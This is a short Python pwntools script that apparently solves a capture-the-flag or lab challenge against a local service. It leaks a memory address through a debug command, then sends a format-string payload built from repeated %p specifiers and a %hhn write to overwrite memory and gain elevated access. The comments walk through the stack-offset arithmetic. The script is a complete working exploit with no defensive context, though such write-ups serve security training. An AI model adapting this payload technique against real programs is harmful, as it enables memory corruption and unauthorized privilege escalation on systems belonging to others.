import pwn

connection = pwn.remote("localhost", 9999)

connection.sendline(b"default")
connection.recvuntil(b"> ")
connection.sendline(b"debug")

address = connection.recvline().strip().split()[2][2:]
address = pwn.unhex(address)
address = int.from_bytes(address, byteorder="big")

# Start of string occurs at offset 56, string prefix size is 16.
# Cursor is at position 0, string prefix size is 18 (extra = 0 quadwords).
# Cursor is at position 8, string prefix size of 20 (extra = 1 quadword).
# Cursor is at position 16, string prefix size of 22 (extra = 2 quadwords).
# Cursor is at position 24, string prefix size of 24 (extra = 3 quadwords).

# Add 7 %p specifiers to move to the start of the format string.
# By some napkin math, we need 3 extra %p specifiers to align
# the stack pointer with the address that we write at the end of the payload.
payload = b"%p" * (7 + 3) \
        + b"%hhn" \
        + pwn.pack(address, 64, "little", "unsigned")

print(f"[.] Address: {hex(address)}")
print(f"[.] Payload: {payload}")

connection.sendline(b"update")
connection.sendline(payload)

connection.recvuntil(b"> ")
connection.recvuntil(b"> ")

connection.sendline(b"whoami")
connection.recvuntil(b"> ")

connection.sendline(b"quote")

print(f"[.] Response: {connection.recvline()}")

connection.close()
